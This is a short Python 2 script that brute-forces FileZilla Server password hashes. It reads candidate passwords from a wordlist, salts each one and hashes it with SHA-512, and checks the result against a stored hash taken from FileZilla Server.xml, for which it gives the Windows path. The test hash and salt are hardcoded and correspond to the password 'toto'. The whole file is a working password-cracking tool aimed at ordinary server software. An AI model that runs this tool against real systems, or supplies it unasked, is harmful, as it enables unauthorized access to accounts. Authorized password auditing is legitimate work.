import hashlib, binascii, sys, time, argparse
from time import sleep

# test data which work for the password "toto"
# Location: "C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml"
# Remember to unescape your SALT string, since FileZilla will store &gt; for < etc. 
password = '8112E67312B4EF84DB1A4F969C21E9405577162ACF761F26F1603C62BBA6046E90C7E13F696C1D2737F7196374DB673FB82E59D7C089C4F1134991698A08EC09'.lower()
salt = '`!U3`CQ;a&3IzbXc/4Wpb\\)OZ3TsXP;\'Wx#^K"Tu_XX.K\'o<\'c&A:vItTX-M|Z0Y'.encode('utf-8')

parser = argparse.ArgumentParser()
parser.add_argument('--wordlist', metavar="<wordlist>", required=True, help="wordlist to use for brute forcing")
args = parser.parse_args()

wordlist = args.wordlist
print "Using wordlist " + wordlist
sleep(2)

f = open(wordlist)
pw = f.readline()
while pw:
	pw = pw.rstrip()
	print "Processing the password: " + pw
	hash = hashlib.sha512(pw + salt).hexdigest()
	if (hash == password):
		print "\nFound the password:" + pw
		print "-----PROOF----"
		print "PW-Hash:" + (hashlib.sha512(pw + salt).hexdigest())
		print "FZ-Hash:" + (password)
		print "-------------"
		exit()
	# use realine() to read next line
	pw = f.readline()
f.close()
